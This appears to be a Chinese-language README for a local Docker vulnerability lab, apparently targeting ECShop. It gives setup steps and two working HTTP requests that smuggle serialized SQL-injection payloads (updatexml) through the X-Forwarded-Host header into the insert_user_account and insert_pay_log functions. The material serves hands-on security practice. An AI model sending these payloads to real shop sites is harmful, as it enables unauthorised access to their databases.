开启靶场:
```
docker compose up -d
```
进入安装：
```
http://localhost:18080
```
数据库地址：`root`
数据库用户名和密码：`root`

实现此漏洞需要先以普通用户身份登录：
有多个`insert_`函数可以用于漏洞利用：
例如`insert_user_account`:
```
GET /user.php?act=collection_list HTTP/1.1
X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953auser_account|a:2:{s:7:"user_id";s:38:"0'-(updatexml(1,repeat(user(),2),1))-'";s:7:"payment";s:1:"4";}|45ea207d7a2b68c49582d2d22adf953a
```
还有`insert_pay_log`：
```
GET /user.php?act=collection_list HTTP/1.1
X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953apay_log|s:44:"1' and updatexml(1,repeat(user(),2),1) and '";|
```
